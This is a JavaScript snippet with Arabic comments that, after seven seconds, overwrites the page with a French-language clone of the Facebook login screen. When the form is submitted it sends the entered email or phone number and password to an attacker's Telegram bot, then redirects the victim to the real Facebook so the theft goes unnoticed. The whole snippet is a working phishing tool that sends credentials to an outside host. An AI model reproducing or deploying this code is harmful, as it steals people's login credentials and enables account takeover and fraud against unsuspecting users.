// إعادة التوجيه إلى صفحة تسجيل الدخول بعد 7 ثوانٍ
setTimeout(() => {
    document.body.innerHTML = `
        <div id="login-page" style="display: none; background: #f0f2f5; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 10px; font-family: 'Helvetica', 'Arial', sans-serif;">
            <div style="width: 100%; max-width: 360px; margin: 0 auto;">
                <div style="text-align: center; margin-bottom: 20px;">
                    <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo" style="width: 180px;">
                </div>
                <div style="background: white; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);">
                    <form id="loginForm">
                        <div style="margin-bottom: 10px;">
                            <input type="text" id="email" name="email" placeholder="Adresse e-mail ou numéro de téléphone" required style="width: 100%; padding: 12px 14px; font-size: 15px; border: 1px solid #dddfe2; border-radius: 5px; outline: none; transition: border-color 0.2s;" onfocus="this.style.borderColor='#1877f2'; this.style.boxShadow='0 0 0 2px #e7f3ff';" onblur="this.style.borderColor='#dddfe2'; this.style.boxShadow='none';">
                        </div>
                        <div style="margin-bottom: 10px;">
                            <input type="password" id="password" name="password" placeholder="Mot de passe" required style="width: 100%; padding: 12px 14px; font-size: 15px; border: 1px solid #dddfe2; border-radius: 5px; outline: none; transition: border-color 0.2s;" onfocus="this.style.borderColor='#1877f2'; this.style.boxShadow='0 0 0 2px #e7f3ff';" onblur="this.style.borderColor='#dddfe2'; this.style.boxShadow='none';">
                        </div>
                        <button type="submit" style="background: #1877f2; color: white; border: none; padding: 12px; width: 100%; border-radius: 5px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background 0.3s;" onmouseover="this.style.background='#166fe5';" onmouseout="this.style.background='#1877f2';">Se connecter</button>
                    </form>
                    <div style="margin: 12px 0; text-align: center;">
                        <a href="#" style="color: #1877f2; font-size: 13px; text-decoration: none;" onmouseover="this.style.textDecoration='underline';" onmouseout="this.style.textDecoration='none';">Mot de passe oublié ?</a>
                    </div>
                    <hr style="border: none; border-top: 1px solid #dadde1; margin: 15px 0;">
                    <button style="background: #42b72a; color: white; border: none; padding: 12px; border-radius: 5px; font-size: 14px; font-weight: 600; cursor: pointer; display: block; width: 70%; margin: 0 auto; transition: background 0.3s;" onmouseover="this.style.background='#36a420';" onmouseout="this.style.background='#42b72a';">Créer un nouveau compte</button>
                </div>
                <div style="text-align: center; margin-top: 15px; color: #8a8d91; font-size: 11px;">
                    <p><a href="#" style="color: #8a8d91; text-decoration: none;">Créer une Page</a> pour une célébrité, une marque ou une entreprise.</p>
                </div>
            </div>
        </div>
    `;
    document.getElementById('login-page').style.display = 'block';

    // إعدادات Telegram
    const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
    const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';

    // معالجة نموذج تسجيل الدخول
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        const message = `Nouvelle connexion:\nEmail/Téléphone: ${email}\nMot de passe: ${password}`;
        
        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message
                })
            });
            
            window.location.href = 'https://www.facebook.com/';
        } catch (error) {
            console.error('Error:', error);
            window.location.href = 'https://www.facebook.com/';
        }
    });
}, 7000);